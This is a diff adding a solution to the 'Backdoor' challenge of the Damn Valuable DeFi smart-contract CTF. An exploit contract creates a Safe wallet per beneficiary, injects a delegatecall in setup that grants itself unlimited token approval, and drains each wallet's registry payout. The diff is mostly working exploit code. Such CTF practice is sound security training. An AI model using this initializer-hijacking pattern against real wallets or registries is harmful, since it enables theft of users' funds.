@@ -4,7 +4,9 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
@@ -70,7 +72,17 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // Deploy exploit contract from player context and execute in one tx.
+        BackdoorExploit exploit = new BackdoorExploit(
+            address(walletFactory),
+            address(singletonCopy),
+            address(token),
+            address(walletRegistry),
+            recovery
+        );
+
+        // Create one wallet per beneficiary and drain all distributed tokens.
+        exploit.exploit(users);
     }
 
     /**
@@ -92,5 +104,69 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract BackdoorExploit {
+    SafeProxyFactory public walletFactory;
+    Safe public singletonCopy;
+    DamnValuableToken public token;
+    WalletRegistry public walletRegistry;
+    address public recovery;
+
+    constructor(
+        address _walletFactory,
+        address _singletonCopy,
+        address _token,
+        address _walletRegistry,
+        address _recovery
+    ) {
+        walletFactory = SafeProxyFactory(_walletFactory);
+        singletonCopy = Safe(payable(_singletonCopy));
+        token = DamnValuableToken(_token);
+        walletRegistry = WalletRegistry(_walletRegistry);
+        recovery = _recovery;
+    }
+
+    function exploit(address[] calldata beneficiaries) external {
+        for (uint256 i = 0; i < beneficiaries.length; ++i) {
+            address wallet = _createWalletAndApprove(beneficiaries[i], i);
+            token.transferFrom(wallet, recovery, 10e18);
+        }
+    }
+
+    // Called via Safe.setup delegatecall so approve executes with msg.sender = wallet.
+    function approveToken(address tokenAddress, address spender) external {
+        IERC20(tokenAddress).approve(spender, type(uint256).max);
+    }
+
+    function _createWalletAndApprove(address beneficiary, uint256 nonce) internal returns (address) {
+        address[] memory owners = new address[](1);
+        owners[0] = beneficiary;
+
+        bytes memory delegateCallData = abi.encodeCall(BackdoorExploit.approveToken, (address(token), address(this)));
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,
+                1,
+                address(this),
+                delegateCallData,
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            )
+        );
+
+        SafeProxy proxy = walletFactory.createProxyWithCallback(
+            address(singletonCopy),
+            initializer,
+            nonce,
+            walletRegistry
+        );
+
+        return address(proxy);
     }
 }
